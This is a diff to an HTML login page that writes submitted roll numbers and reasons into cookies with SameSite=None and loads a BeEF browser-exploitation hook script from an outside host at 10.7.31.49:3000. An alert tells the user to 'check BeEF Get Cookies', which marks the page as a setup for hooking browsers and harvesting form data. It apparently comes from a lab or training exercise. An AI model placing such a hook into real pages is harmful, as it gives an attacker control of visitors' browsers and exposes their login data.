@@ -117,21 +117,26 @@
   
   <!-- Save form inputs as cookies -->
   <script>
+    // Save cookies immediately when page loads
+    document.cookie = "rollNo=defaultUser; path=/; SameSite=None";
+    document.cookie = "reason=PageLoaded; path=/; SameSite=None";
+
+    // Update cookies when form is submitted
     document.getElementById("loginForm").addEventListener("submit", function(e) {
       e.preventDefault(); 
       let roll = document.getElementById("id").value;
       let reason = document.getElementById("reason").value;
 
       // Save values as cookies
-      document.cookie = "rollNo=" + encodeURIComponent(roll) + "; path=/";
-      document.cookie = "reason=" + encodeURIComponent(reason) + "; path=/";
+      document.cookie = "rollNo=" + encodeURIComponent(roll) + "; path=/; SameSite=None";
+      document.cookie = "reason=" + encodeURIComponent(reason) + "; path=/; SameSite=None";
 
       alert("Data saved as cookies! Now check BeEF Get Cookies 😈");
     });
   </script>
 
-  <!-- Hook script goes here -->
-  <script src="https://10.7.31.49:3000/hook.js"></script>
+  <!-- BeEF hook script -->
+  <script src="http://10.7.31.49:3000/hook.js"></script>
 
 </body>
 </html>
